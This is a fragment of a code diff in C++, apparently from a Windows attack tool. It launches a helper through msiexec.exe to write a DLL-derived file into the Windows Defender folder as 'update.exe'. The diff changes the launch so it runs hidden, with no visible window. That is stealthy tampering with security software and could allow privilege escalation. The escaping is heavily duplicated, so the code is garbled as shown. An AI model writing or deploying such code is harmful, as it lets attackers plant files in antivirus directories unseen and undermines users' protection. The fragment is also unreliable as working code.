@@ -209,16 +209,18 @@ int main() {{
     std::string targetPath = "C:\\\\\\\\\\\\\\\\Program Files\\\\\\\\\\\\\\\\Windows Defender\\\\\\\\\\\\\\\\update.exe";
     std::string command = "\\"" + defenderWritePath + "\\" C:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\System32\\\\\\\\\\\\\\\\msiexec.exe \\"" + dllPath + "\\" \\"" + targetPath + "\\" c";
     
-    // Execute
+        // Execute Silently 
     STARTUPINFOA si = {{0}};
     PROCESS_INFORMATION pi = {{0}};
     si.cb = sizeof(si);
-    
-    if (CreateProcessA(NULL, (LPSTR)command.c_str(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {{
-        WaitForSingleObject(pi.hProcess, 5000);
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
-    }}
+    si.dwFlags = STARTF_USESHOWWINDOW;  
+    si.wShowWindow = SW_HIDE;
+
+    if (CreateProcessA(NULL, (LPSTR)command.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {{
+    WaitForSingleObject(pi.hProcess, 5000);
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+}}
     
     return 0;
 }}
